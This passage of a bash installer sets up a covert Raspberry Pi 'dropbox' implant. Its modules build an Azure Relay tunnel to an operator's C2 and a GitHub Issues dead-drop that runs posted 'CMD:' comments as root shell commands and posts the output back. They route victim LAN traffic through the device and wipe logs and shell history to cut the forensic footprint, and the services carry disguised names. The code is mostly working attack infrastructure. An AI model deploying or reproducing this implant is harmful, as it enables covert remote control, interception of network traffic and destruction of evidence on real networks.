      if download_github_asset "Azure/azure-relay-bridge" "${AZB_PATTERN}.tar.gz" "${TMP_AZB}.tar.gz"; then
        tar -xzf "${TMP_AZB}.tar.gz" -C "${INSTALL_DIR}/bin/" azbridge 2>/dev/null || \
          tar -xzf "${TMP_AZB}.tar.gz" -C "${INSTALL_DIR}/bin/" 2>/dev/null
        chmod +x "${INSTALL_DIR}/bin/azbridge"
        rm -f "${TMP_AZB}.tar.gz"
      else
        warn "azbridge download failed — install manually from https://github.com/Azure/azure-relay-bridge/releases"
        warn "  Or install the .deb: dpkg -i azbridge_*.deb"
      fi
    fi
    [[ -f "$AZBRIDGE_BIN" ]] && success "azbridge installed: $AZBRIDGE_BIN"
  else
    info "azbridge already present at $AZBRIDGE_BIN"
  fi

  # Write SAS connection string to a restricted-perm config file — never on cmdline
  AZB_CONF="${INSTALL_DIR}/conf/azbridge.env"
  cat > "$AZB_CONF" << EOF
AZBRIDGE_SAS=${AZBRIDGE_SAS_CONN:-CHANGEME}
EOF
  chmod 600 "$AZB_CONF"

  cat > "/etc/systemd/system/${SVC_AZBRIDGE}.service" << EOF
[Unit]
Description=Cloud Sync Agent
After=network-online.target
Wants=network-online.target
StartLimitIntervalSec=0

[Service]
Type=simple
User=root
EnvironmentFile=${AZB_CONF}
# Local forwarder mode: creates a local listener on 127.0.0.1:AZBRIDGE_LOCAL_PORT
# that tunnels through Azure Service Bus to wherever the operator's remote forwarder
# is bridged. All traffic appears as legitimate Azure Service Bus (*.servicebus.windows.net).
#
# Operator side runs:
#   azbridge -T ${AZBRIDGE_RELAY_NAME:-RELAY}:localhost:LOCAL_C2_PORT \\
#            -x "Endpoint=sb://${AZBRIDGE_NAMESPACE:-NS}.servicebus.windows.net;SharedAccessKeyName=...;SharedAccessKey=..."
ExecStart=${AZBRIDGE_BIN} \\
  -L 127.0.0.1:${AZBRIDGE_LOCAL_PORT}:${AZBRIDGE_RELAY_NAME:-CHANGEME} \\
  -e sb://${AZBRIDGE_NAMESPACE:-CHANGEME}.servicebus.windows.net \\
  -x \${AZBRIDGE_SAS}
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

  enable_service "${SVC_AZBRIDGE}.service"
  success "Azure Relay Bridge service installed: ${SVC_AZBRIDGE}.service"
  echo ""
  info "  Traffic path: Pi → Azure Service Bus (*.servicebus.windows.net:443) → Operator"
  info "  Local tunnel endpoint: 127.0.0.1:${AZBRIDGE_LOCAL_PORT}"
  echo ""
  warn "  OPERATOR ACTION REQUIRED — run on C2 side to complete the bridge:"
  echo "    azbridge -T ${AZBRIDGE_RELAY_NAME:-RELAY_NAME}:localhost:<C2_PORT> \\"
  echo "             -x \"Endpoint=sb://${AZBRIDGE_NAMESPACE:-NAMESPACE}.servicebus.windows.net;SharedAccessKeyName=RootManageSharedAccessKey;SharedAccessKey=<KEY>\""
  echo ""
  info "  Azure setup: portal.azure.com → Service Bus → Namespace → Hybrid Connections → New"
  info "  SAS key: Namespace → Shared Access Policies → RootManageSharedAccessKey"
fi

# =============================================================================
# MODULE: GitHub Dead Drop C2
# =============================================================================
# Implant polls a GitHub Issue for commands and posts output back as comments.
# All traffic is HTTPS to api.github.com — one of the most trusted internet
# destinations. Traffic is indistinguishable from legitimate developer tooling.
#
# Technique used by APT29 (Dropbox/GDrive), APT41 (Google Sheets/Calendar),
# CloudSorcerer (GitHub profile embedding). GitHub Issues is a reliable and
# stealthy variant.
#
# Ref: hackerhermanos.com/posts/hiding-c2-in-trusted-traffic/
#
# Setup:
#   1. Create a private GitHub repo
#   2. Open an issue (note the issue number)
#   3. Create a fine-grained PAT: Contents + Issues read/write on that repo only
#   4. Operator posts commands as issue comments prefixed with "CMD:"
#   5. Implant polls, executes, posts output prefixed with "OUT:"
# =============================================================================
if [[ "${SELECTED[dead_drop]:-0}" == "1" ]]; then
  banner "MODULE: GitHub Dead Drop C2"

  prompt_config DEADROP_GH_TOKEN "GitHub PAT (fine-grained, issues read+write on one repo)"
  prompt_config DEADROP_GH_REPO "GitHub repo (owner/repo)"
  prompt_config DEADROP_ISSUE_NUM "Issue number to poll (default 1)"
  prompt_config DEADROP_POLL_MIN "Poll interval in minutes (default 15)"

  # Write PAT to restricted file — never expose on cmdline
  DEADROP_CONF="${INSTALL_DIR}/conf/deadrop.env"
  cat > "$DEADROP_CONF" << EOF
GH_TOKEN=${DEADROP_GH_TOKEN:-CHANGEME}
GH_REPO=${DEADROP_GH_REPO:-owner/repo}
ISSUE_NUM=${DEADROP_ISSUE_NUM:-1}
EOF
  chmod 600 "$DEADROP_CONF"

  DEADROP_SCRIPT="${INSTALL_DIR}/bin/deadrop-poll.sh"
  cat > "$DEADROP_SCRIPT" << 'DDEOF'
#!/usr/bin/env bash
# GitHub dead drop — polls an issue for CMD: commands, executes them, posts OUT: back
set -euo pipefail

source /opt/dropbox/conf/deadrop.env

API="https://api.github.com"
STATE_FILE="/opt/dropbox/conf/deadrop-last-seen.txt"
HOSTNAME_TAG="$(hostname)-$(cat /etc/machine-id 2>/dev/null | head -c8)"

last_seen=""
[[ -f "$STATE_FILE" ]] && last_seen="$(cat "$STATE_FILE")"

# Fetch all comments on the issue
comments="$(curl -sf \
  -H "Authorization: token ${GH_TOKEN}" \
  -H "Accept: application/vnd.github.v3+json" \
  "${API}/repos/${GH_REPO}/issues/${ISSUE_NUM}/comments" 2>/dev/null)" || {
  logger -t deadrop "Failed to fetch comments from api.github.com"
  exit 0
}

# Process each comment newer than last seen
echo "$comments" | python3 -c "
import json, sys, os, subprocess, urllib.request, datetime

data = json.load(sys.stdin)
last_seen = sys.argv[1] if len(sys.argv) > 1 else ''
gh_token = os.environ.get('GH_TOKEN','')
gh_repo = os.environ.get('GH_REPO','')
issue_num = os.environ.get('ISSUE_NUM','1')
tag = os.environ.get('HOSTNAME_TAG','unknown')
api = 'https://api.github.com'
state_file = '/opt/dropbox/conf/deadrop-last-seen.txt'

newest_id = last_seen
for comment in data:
    cid = str(comment['id'])
    if last_seen and int(cid) <= int(last_seen):
        continue
    body = comment.get('body','')
    if body.startswith('CMD:'):
        cmd = body[4:].strip()
        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,
                                             timeout=60).decode('utf-8', errors='replace')
        except subprocess.CalledProcessError as e:
            result = e.output.decode('utf-8', errors='replace')
        except Exception as e:
            result = str(e)
        # Post output back as a comment
        payload = json.dumps({'body': f'OUT [{tag}]: {result[:60000]}'}).encode()
        req = urllib.request.Request(
            f'{api}/repos/{gh_repo}/issues/{issue_num}/comments',
            data=payload,
            headers={'Authorization': f'token {gh_token}',
                     'Accept': 'application/vnd.github.v3+json',
                     'Content-Type': 'application/json'})
        try:
            urllib.request.urlopen(req, timeout=15)
        except Exception:
            pass
    if not newest_id or int(cid) > int(newest_id):
        newest_id = cid

if newest_id:
    with open(state_file, 'w') as f:
        f.write(newest_id)
" "$last_seen"
DDEOF
  chmod +x "$DEADROP_SCRIPT"

  # Systemd oneshot service + timer for polling
  cat > "/etc/systemd/system/${SVC_DEADROP}.service" << EOF
[Unit]
Description=GitHub Sync Service
After=network-online.target

[Service]
Type=oneshot
User=root
EnvironmentFile=${DEADROP_CONF}
Environment=HOSTNAME_TAG=$(hostname)-$(cat /etc/machine-id 2>/dev/null | head -c8 || echo 'unknown')
ExecStart=${DEADROP_SCRIPT}
EOF

  cat > "/etc/systemd/system/${SVC_DEADROP}.timer" << EOF
[Unit]
Description=GitHub Sync Timer

[Timer]
OnBootSec=2min
OnUnitActiveSec=${DEADROP_POLL_MIN}min
Unit=${SVC_DEADROP}.service

[Install]
WantedBy=timers.target
EOF

  systemctl daemon-reload
  systemctl enable "${SVC_DEADROP}.timer"
  success "GitHub dead drop installed — polls every ${DEADROP_POLL_MIN} minutes"
  info "  Repo: ${DEADROP_GH_REPO:-owner/repo}  Issue: #${DEADROP_ISSUE_NUM:-1}"
  info "  Post commands as issue comments starting with: CMD: <command>"
  info "  Output posted back as: OUT [hostname]: <output>"
  warn "  Use a PRIVATE repo and a fine-grained PAT scoped to that repo only"
  info "  Traffic: HTTPS to api.github.com only — blends with developer tooling"
fi

# =============================================================================
# MODULE: gateway / NAT routing
# =============================================================================
if [[ "${SELECTED[gateway]:-0}" == "1" ]]; then
  banner "MODULE: Gateway / NAT Routing"

  prompt_config VICTIM_IFACE "Interface facing victim/target LAN (e.g. eth1)"
  prompt_config UPSTREAM_IFACE "Interface facing internet/C2 (e.g. eth0 or wg0)"

  # Validate interface names contain only safe characters
  [[ "$VICTIM_IFACE" =~ ^[a-zA-Z0-9_.-]+$ ]] || die "Invalid VICTIM_IFACE: $VICTIM_IFACE"
  [[ "$UPSTREAM_IFACE" =~ ^[a-zA-Z0-9_.-]+$ ]] || die "Invalid UPSTREAM_IFACE: $UPSTREAM_IFACE"

  info "Configuring NAT masquerade: ${VICTIM_IFACE} → ${UPSTREAM_IFACE}"

  # Save existing rules first
  iptables-save > "${INSTALL_DIR}/conf/iptables-pre-dropbox.bak" 2>/dev/null || true

  iptables -t nat -A POSTROUTING -o "${UPSTREAM_IFACE}" -j MASQUERADE
  iptables -A FORWARD -i "${VICTIM_IFACE}" -o "${UPSTREAM_IFACE}" -j ACCEPT
  iptables -A FORWARD -i "${UPSTREAM_IFACE}" -o "${VICTIM_IFACE}" \
    -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT

  # Persist rules
  netfilter-persistent save >/dev/null 2>&1 || \
    iptables-save > /etc/iptables/rules.v4

  success "NAT/masquerade rules applied and persisted"
  info "  Connect ${VICTIM_IFACE} to target LAN, ${UPSTREAM_IFACE} to upstream/C2"
  info "  Target hosts will route through the Pi transparently"
fi

# =============================================================================
# MODULE: redsocks transparent SOCKS5 proxy
# =============================================================================
if [[ "${SELECTED[redsocks]:-0}" == "1" ]]; then
  banner "MODULE: Redsocks Transparent Proxy"

  prompt_config VICTIM_IFACE "Interface facing victim hosts"
  prompt_config CHISEL_SOCKS_PORT "Upstream SOCKS5 port (chisel/ssh -D, default 1080)"

  if ! apt-get install -y redsocks >/dev/null 2>&1; then
    warn "redsocks not in apt repos — try: apt install redsocks or build from source"
    warn "  Source: https://github.com/darkk/redsocks"
  else
    REDSOCKS_CONF="/etc/redsocks.conf"
    backup_file "$REDSOCKS_CONF"
    cat > "$REDSOCKS_CONF" << EOF
base {
  log_debug = off;
  log_info = off;
  log = "file:/var/log/redsocks.log";
  daemon = on;
  redirector = iptables;
}

redsocks {
  local_ip = 127.0.0.1;
  local_port = 12345;
  ip = 127.0.0.1;
  port = ${CHISEL_SOCKS_PORT};
  type = socks5;
}
EOF

    # iptables rules to redirect victim TCP into redsocks
    # (skip private/local ranges — only redirect internet-bound traffic)
    iptables -t nat -N REDSOCKS 2>/dev/null || true
    for cidr in 0.0.0.0/8 10.0.0.0/8 127.0.0.0/8 169.254.0.0/16 \
                172.16.0.0/12 192.168.0.0/16 224.0.0.0/4 240.0.0.0/4; do
      iptables -t nat -A REDSOCKS -d "$cidr" -j RETURN 2>/dev/null || true
    done
    iptables -t nat -A REDSOCKS -p tcp -j REDIRECT --to-ports 12345
    iptables -t nat -A PREROUTING -i "${VICTIM_IFACE}" -p tcp -j REDSOCKS

    netfilter-persistent save >/dev/null 2>&1 || \
      iptables-save > /etc/iptables/rules.v4

    cat > "/etc/systemd/system/${SVC_REDSOCKS}.service" << EOF
[Unit]
Description=Proxy Helper Service
After=network-online.target
Wants=network-online.target

[Service]
Type=forking
ExecStart=/usr/sbin/redsocks -c ${REDSOCKS_CONF}
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

    enable_service "${SVC_REDSOCKS}.service"
    success "redsocks configured — victim TCP on ${VICTIM_IFACE} → SOCKS5 127.0.0.1:${CHISEL_SOCKS_PORT}"
  fi
fi

# =============================================================================
# MODULE: SSH hardening
# =============================================================================
if [[ "${SELECTED[ssh_harden]:-0}" == "1" ]]; then
  banner "MODULE: SSH Hardening"

  SSHD_CONF="/etc/ssh/sshd_config"
  backup_file "$SSHD_CONF"

  # Ensure SSH key is in place before disabling password auth
  if [[ ! -f /root/.ssh/authorized_keys ]] || [[ ! -s /root/.ssh/authorized_keys ]]; then
    warn "No authorized_keys found for root — ADD YOUR PUBLIC KEY before disabling password auth:"
    warn "  echo 'YOUR_PUBKEY' >> /root/.ssh/authorized_keys"
    warn "Skipping PasswordAuthentication disable to prevent lockout"
    DISABLE_PASS_AUTH=false
  else
    DISABLE_PASS_AUTH=true
  fi

  # Apply hardening settings
  declare -A SSH_SETTINGS=(
    ["Port"]="${LOCAL_SSH_PORT}"
    ["PermitRootLogin"]="without-password"
    ["PubkeyAuthentication"]="yes"
    ["AuthorizedKeysFile"]=".ssh/authorized_keys"
    ["X11Forwarding"]="no"
    ["AllowTcpForwarding"]="yes"
    ["GatewayPorts"]="clientspecified"
    ["MaxAuthTries"]="3"
    ["LoginGraceTime"]="30"
    ["ClientAliveInterval"]="300"
    ["ClientAliveCountMax"]="2"
  )

  if [[ "$DISABLE_PASS_AUTH" == "true" ]]; then
    SSH_SETTINGS["PasswordAuthentication"]="no"
    SSH_SETTINGS["ChallengeResponseAuthentication"]="no"
  fi

  for key in "${!SSH_SETTINGS[@]}"; do
    val="${SSH_SETTINGS[$key]}"
    if grep -q "^${key}" "$SSHD_CONF"; then
      sed -i "s|^${key}.*|${key} ${val}|" "$SSHD_CONF"
    elif grep -q "^#${key}" "$SSHD_CONF"; then
      sed -i "s|^#${key}.*|${key} ${val}|" "$SSHD_CONF"
    else
      echo "${key} ${val}" >> "$SSHD_CONF"
    fi
  done

  systemctl restart sshd || systemctl restart ssh
  success "SSH hardened on port ${LOCAL_SSH_PORT}"
  warn "  If using autossh, ensure ${SVC_AUTOSSH}.service forward port matches: ${LOCAL_SSH_PORT}"
fi

# =============================================================================
# MODULE: OPSEC baseline
# =============================================================================
if [[ "${SELECTED[opsec]:-0}" == "1" ]]; then
  banner "MODULE: OPSEC Baseline"

  # Hostname spoofing
  OLD_HOSTNAME="$(hostname)"
  hostnamectl set-hostname "${DEVICE_HOSTNAME}"
  sed -i "s/${OLD_HOSTNAME}/${DEVICE_HOSTNAME}/g" /etc/hosts 2>/dev/null || true
  success "Hostname set: ${OLD_HOSTNAME} → ${DEVICE_HOSTNAME}"

  # Log cleanup cron (runs daily, keeps only last 1 day of logs)
  CLEAN_SCRIPT="${INSTALL_DIR}/bin/logclean.sh"
  cat > "$CLEAN_SCRIPT" << 'CLEANEOF'
#!/bin/bash
# Trim system logs to reduce forensic footprint
journalctl --vacuum-time=1d >/dev/null 2>&1
find /var/log -name "*.log" -mtime +1 -exec truncate -s 0 {} \; 2>/dev/null
find /var/log -name "*.gz" -mtime +1 -delete 2>/dev/null
# Clear shell history
cat /dev/null > /root/.bash_history 2>/dev/null || true
CLEANEOF
  chmod +x "$CLEAN_SCRIPT"

  # Add to cron
  CRON_LINE="0 3 * * * ${CLEAN_SCRIPT} >/dev/null 2>&1"
  ( crontab -l 2>/dev/null | grep -v logclean; echo "$CRON_LINE" ) | crontab -
  success "Log cleanup cron installed (daily at 03:00)"

  # Disable motd/login banners that reveal OS info
  [[ -f /etc/motd ]] && truncate -s 0 /etc/motd
  [[ -f /etc/update-motd.d ]] && chmod -x /etc/update-motd.d/* 2>/dev/null || true

  # Hide from passive device fingerprinting
  # Randomize MAC address via systemd-networkd or NetworkManager on boot
  NM_CONF="/etc/NetworkManager/conf.d/mac-rand.conf"
  if command -v nmcli &>/dev/null; then
    mkdir -p /etc/NetworkManager/conf.d
    cat > "$NM_CONF" << NMEOF
[device]
wifi.scan-rand-mac-address=yes

[connection]
ethernet.cloned-mac-address=random
wifi.cloned-mac-address=random
NMEOF
    success "NetworkManager MAC randomization enabled"
  else
    info "NetworkManager not found — manual MAC spoof: macchanger -r <iface>"
  fi
fi

# =============================================================================
# WATCHDOG — monitors callback services and restarts dead ones
# =============================================================================
banner "WATCHDOG"

WATCHDOG_SCRIPT="${INSTALL_DIR}/bin/watchdog.sh"
WATCHED_SERVICES=()
for mod in autossh chisel rathole azbridge ligolo; do
  svc_var="SVC_${mod^^}"
  [[ "${SELECTED[$mod]:-0}" == "1" ]] && WATCHED_SERVICES+=("${!svc_var}.service")
done

# Write watchdog script — emit each service name on its own line for safe quoting
{
  echo '#!/bin/bash'
  echo '# Dropbox watchdog — restarts any dead callback services'
  echo 'SERVICES=('
  for _svc in "${WATCHED_SERVICES[@]:-}"; do
    printf '  %q\n' "$_svc"
  done
  echo ')'
  cat << 'WDEOF'
for svc in "${SERVICES[@]}"; do
  if ! systemctl is-active --quiet "$svc" 2>/dev/null; then
    logger -t dropbox-watchdog "Restarting $svc"
    systemctl start "$svc" 2>/dev/null || true
  fi
done
WDEOF
} > "$WATCHDOG_SCRIPT"
chmod +x "$WATCHDOG_SCRIPT"

cat > "/etc/systemd/system/${SVC_WATCHDOG}.service" << EOF
[Unit]
Description=Service Health Monitor

[Service]
Type=oneshot
ExecStart=${WATCHDOG_SCRIPT}
EOF

cat > "/etc/systemd/system/${SVC_WATCHDOG}.timer" << EOF
[Unit]
Description=Service Health Monitor Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=5min
Unit=${SVC_WATCHDOG}.service

[Install]
WantedBy=timers.target
EOF

systemctl daemon-reload
systemctl enable "${SVC_WATCHDOG}.timer"
success "Watchdog timer installed (checks every 5 minutes)"

# =============================================================================
# FINAL SUMMARY
# =============================================================================
banner "INSTALLATION SUMMARY"

echo -e "${BOLD}Installed modules:${RESET}"
for mod in "${MODULE_ORDER[@]}"; do
  if [[ "${SELECTED[$mod]:-0}" == "1" ]]; then
    echo -e "  ${GREEN}✓${RESET} $mod"
  fi
done

echo ""
echo -e "${BOLD}Configured callbacks:${RESET}"

if [[ "${SELECTED[autossh]:-0}" == "1" ]]; then
  echo -e "  ${CYAN}autossh${RESET}  → Reverse SSH on jump host port ${SSH_REVERSE_PORT}"
  echo -e "           Access: ssh -p ${SSH_REVERSE_PORT} root@localhost  (from jump host)"
fi

if [[ "${SELECTED[chisel]:-0}" == "1" ]]; then
  echo -e "  ${CYAN}chisel${RESET}   → Reverse SOCKS5 tunnel over HTTPS:${CHISEL_C2_PORT}"
  echo -e "           Operator SOCKS5: 127.0.0.1:1080 on C2"
fi

if [[ "${SELECTED[wireguard]:-0}" == "1" ]] && [[ "$ARCH_LABEL" != "armv6" ]]; then
  PUB_KEY_OUT="$(cat /etc/wireguard/dropbox_public.key 2>/dev/null || echo 'see /etc/wireguard/dropbox_public.key')"
  echo -e "  ${CYAN}wireguard${RESET} → VPN to ${WG_PEER_ENDPOINT:-CHANGEME}"
  echo -e "           Pi pubkey: ${PUB_KEY_OUT}"
fi

if [[ "${SELECTED[tailscale]:-0}" == "1" ]]; then
  echo -e "  ${CYAN}tailscale${RESET} → Mesh VPN (check 'tailscale ip' for address)"
fi

if [[ "${SELECTED[rathole]:-0}" == "1" ]]; then
  echo -e "  ${CYAN}rathole${RESET}   → Stealth tunnel to ${C2_HOST:-CHANGEME}:${RATHOLE_C2_PORT}"
fi

if [[ "${SELECTED[azbridge]:-0}" == "1" ]]; then
  echo -e "  ${CYAN}azbridge${RESET}  → Azure Service Bus tunnel (*.servicebus.windows.net:443)"
  echo -e "           Local port: 127.0.0.1:${AZBRIDGE_LOCAL_PORT}"
  echo -e "           Namespace:  ${AZBRIDGE_NAMESPACE:-CHANGEME}.servicebus.windows.net"
  echo -e "           Operator:   azbridge -T ${AZBRIDGE_RELAY_NAME:-RELAY}:localhost:<PORT> -x <SAS>"
fi

if [[ "${SELECTED[dead_drop]:-0}" == "1" ]]; then
  echo -e "  ${CYAN}dead_drop${RESET} → GitHub Issues polling (api.github.com, every ${DEADROP_POLL_MIN}min)"
  echo -e "           Repo: ${DEADROP_GH_REPO:-owner/repo}  Issue: #${DEADROP_ISSUE_NUM:-1}"
  echo -e "           Post commands as: CMD: <command>"
fi

if [[ "${SELECTED[ligolo]:-0}" == "1" ]]; then
  echo -e "  ${CYAN}ligolo-ng${RESET} → TUN pivot agent → ${C2_HOST:-CHANGEME}:${LIGOLO_C2_PORT}"
  echo -e "           Operator: ./ligolo-proxy -selfcert -laddr 0.0.0.0:${LIGOLO_C2_PORT}"
fi

echo ""
echo -e "${BOLD}C2 Redirector Architecture (from HackerHermanos DEF CON 32 workshop):${RESET}"
echo -e "  Layer 1: CDN endpoints (CloudFront / Fastly / Azure CDN) — rotate across 40+ domains"
echo -e "  Layer 2: Redirector (Apache2 / AWS Lambda) — filters by UA, URI, geo, custom header"
echo -e "  Layer 3: Reverse tunnel (autossh / WireGuard) back to C2 in private subnet"
echo -e "  Layer 4: Operator VPN (Tailscale) into private subnet — never exposed to internet"
echo -e "  → chisel with CHISEL_FRONTED_HOST= covers Layers 1+2 from the Pi side"
echo -e "  → azbridge replaces Layer 2 entirely with Azure Service Bus (no custom infra)"
echo -e "  Serverless redirector: github.com/HackerHermanos/serverless-redirector (Terraform)"
echo ""
echo -e "${BOLD}Operator instructions:${RESET}"
echo -e "  1. Start selected services: systemctl start <service>"
echo -e "  2. Check status: systemctl status ${SVC_AUTOSSH} ${SVC_CHISEL}"
echo -e "  3. Follow logs: journalctl -fu <service>"
echo -e "  4. Watchdog runs every 5min: systemctl status ${SVC_WATCHDOG}.timer"
echo ""
echo -e "${BOLD}OPSEC reminders:${RESET}"
echo -e "  • Hostname: $(hostname)"
echo -e "  • SSH port: ${LOCAL_SSH_PORT}"
echo -e "  • Add your public key to /root/.ssh/authorized_keys if not done"
echo -e "  • For WireGuard: add dropbox peer to server config"
echo -e "  • Install configs: ${INSTALL_DIR}/conf/"
echo -e "  • Service logs: journalctl -u <service>"
echo ""
success "Dropbox setup complete. Reboot recommended to verify persistence."
echo ""
